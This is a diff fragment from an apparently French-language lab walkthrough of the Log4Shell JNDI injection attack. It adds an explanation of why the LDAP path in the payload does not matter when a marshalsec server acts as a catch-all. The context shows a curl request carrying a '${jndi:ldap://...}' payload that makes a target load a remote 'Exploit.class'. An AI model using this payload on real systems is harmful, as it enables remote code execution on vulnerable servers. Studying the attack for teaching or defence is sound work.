@@ -74,7 +74,7 @@ public class Exploit {
       -d '{"username":"${jndi:ldap://192.168.1.150:1389/a}","password":"test"}'
     ```
 
-    L'envoi de la requête finale déclenche la chaîne d'exécution.
+    L'envoi de la requête finale déclenche la chaîne d'exécution. Le chemin `/a` spécifié à la fin de l'URI LDAP n'a pas d'importance technique. Le serveur `marshalsec` instancié à l'étape 1 agit comme un "catch-all" : quelle que soit la ressource précise demandée par la victime (`/a`, `/test`, etc.), il intercepte la requête et renvoie systématiquement la référence JNDI pointant vers le fichier `Exploit.class` ("`#Exploit`").
 
 <br>
 
